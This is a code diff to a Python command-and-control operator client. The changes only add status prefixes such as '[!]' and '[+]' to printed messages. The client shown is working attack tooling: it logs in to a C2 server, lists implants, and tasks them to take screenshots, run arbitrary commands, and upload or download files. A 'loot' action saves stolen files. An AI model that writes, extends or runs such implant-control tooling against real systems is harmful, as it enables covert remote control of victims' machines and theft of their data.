@@ -6,7 +6,7 @@ import json
 
 def display_results(results):
     if not results:
-        print("No results to display.")
+        print("[!] No results to display.")
         return
     
     # Prepare data for tabulation
@@ -45,13 +45,13 @@ def display_imlants(results):
 
 def login(server_url):
     try:
-        username = input("--Enter the username: ")
-        password = input("--Enter the password: ")
+        username = input("[?]--Enter the username: ")
+        password = input("[?]--Enter the password: ")
         response = requests.post(f'{server_url}/profile/login', json={'username': username, 'password': password})
         response.raise_for_status()
         return response.json().get('access_token')
     except requests.exceptions.RequestException as e:
-        print(f"Login failed: {e}")
+        print(f"[!] Login failed: {e}")
         return None
 
 def get_implants(server_url, access_token):
@@ -62,7 +62,7 @@ def get_implants(server_url, access_token):
         
         return response.json()
     except requests.exceptions.RequestException as e:
-        print(f"Failed to retrieve implants: {e}")
+        print(f"[!] Failed to retrieve implants: {e}")
         return None
 
 def get_results(server_url, implant_id, access_token):
@@ -72,7 +72,7 @@ def get_results(server_url, implant_id, access_token):
         response.raise_for_status()
         return response.json()
     except requests.exceptions.RequestException as e:
-        print(f"Failed to retrieve results: {e}")
+        print(f"[!] Failed to retrieve results: {e}")
         return None
     
 def get_file(server_url, access_token, task_id):
@@ -82,15 +82,15 @@ def get_file(server_url, access_token, task_id):
         response.raise_for_status()
 
         if 'image' not in response.headers.get('content-type', ''):
-            print("Server did not return an image.")
+            print("[!] Server did not return an image.")
             return None
         
         save_path = response.headers.get('X-File-Path')
         if not save_path:
-            print("Server did not provide a file path.")
+            print("[!] Server did not provide a file path.")
             return None
 
-        print(f"Saving image to {save_path}")
+        print(f"[+] Saving image to {save_path}")
 
         with open(save_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=1024):
@@ -98,7 +98,7 @@ def get_file(server_url, access_token, task_id):
                     f.write(chunk)
         return save_path
     except requests.exceptions.RequestException as e:
-        print(f"Failed to retrieve image: {e}")
+        print(f"[!] Failed to retrieve image: {e}")
         return None
 
 def post_task(server_url, implant_id, task_type,cmd, access_token):
@@ -106,10 +106,10 @@ def post_task(server_url, implant_id, task_type,cmd, access_token):
         headers = {'Authorization': f'Bearer {access_token}'}
         response = requests.post(f'{server_url}/tasks', headers=headers, json=[{"implant_id": implant_id, "task_type": task_type, "cmd": cmd}])
         response.raise_for_status()
-        print("Task posted successfully.")
+        print("[+] Task posted successfully.")
         return response.json()
     except requests.exceptions.RequestException as e:
-        print(f"Failed to post task: {e}")
+        print(f"[!] Failed to post task: {e}")
         return None
 
 def main():
@@ -138,7 +138,7 @@ def main():
     try:
         while True:
             if args.action == 'exit':
-                print("Exiting C2 CLI.")
+                print("[+] Exiting C2 CLI.")
                 break
 
             if not args.action:
@@ -152,42 +152,42 @@ def main():
             elif args.action == 'add_task':
                 if access_token:
                     
-                    args.implant_id = input("Enter the implant ID to get tasks for:\n>> ").strip()
-                    args.task_type = input("Enter the task type to get tasks for:\n>> ").strip()
+                    args.implant_id = input("[?] Enter the implant ID to get tasks for:\n>> ").strip()
+                    args.task_type = input("[?] Enter the task type to get tasks for:\n>> ").strip()
                     if args.task_type == 'screenshot' or args.task_type == 'ping':
                         post_task(args.server_url, args.implant_id, args.task_type, "", access_token)
                     elif args.task_type == 'download':
-                        args.file_path = input("Enter the file path to download:\n>> ").strip()
+                        args.file_path = input("[?] Enter the file path to download:\n>> ").strip()
                         post_task(args.server_url, args.implant_id, args.task_type, args.file_path, access_token)
                     elif args.task_type == 'cmd':
-                        args.command = input("Enter the command to run:\n>> ").strip()
+                        args.command = input("[?] Enter the command to run:\n>> ").strip()
                         post_task(args.server_url, args.implant_id, args.task_type, args.command, access_token)
                     elif args.task_type == 'upload':
-                        args.file_path = input("Enter the file path to upload:\n>> ").strip()
+                        args.file_path = input("[?] Enter the file path to upload:\n>> ").strip()
                         post_task(args.server_url, args.implant_id, args.task_type, args.file_path, access_token)
                         
                     
             elif args.action == 'results':
                 if access_token:
-                    args.implant_id = input("Enter the implant ID to get results for:\n>> ").strip()
+                    args.implant_id = input("[?] Enter the implant ID to get results for:\n>> ").strip()
                     results = get_results(args.server_url, args.implant_id, access_token)
                     if results:
                         display_results(results)
             elif args.action == 'loot':
                 if access_token:
-                    args.task_id = input("Enter the task ID: ")
+                    args.task_id = input("[?] Enter the task ID: ")
                     results = get_file(args.server_url, access_token, args.task_id)
                     if results:
-                        print("the path is for the saved file is "+results)
+                        print("[+] the path is for the saved file is "+results)
             else:
                 if args.action != 'exit':
-                    print(f"Unknown command '{args.action}'. Please enter a valid command.")
+                    print(f"[!] Unknown command '{args.action}'. Please enter a valid command.")
                 
             args.action = None  # Reset action to prompt again if not exited
     except KeyboardInterrupt:
         print("\nExiting C2 CLI due to keyboard interrupt.")
     except requests.exceptions.RequestException as e:
-        print(f"An error occurred: {e}")
+        print(f"[!] An error occurred: {e}")
 
 if __name__ == "__main__":
     main()
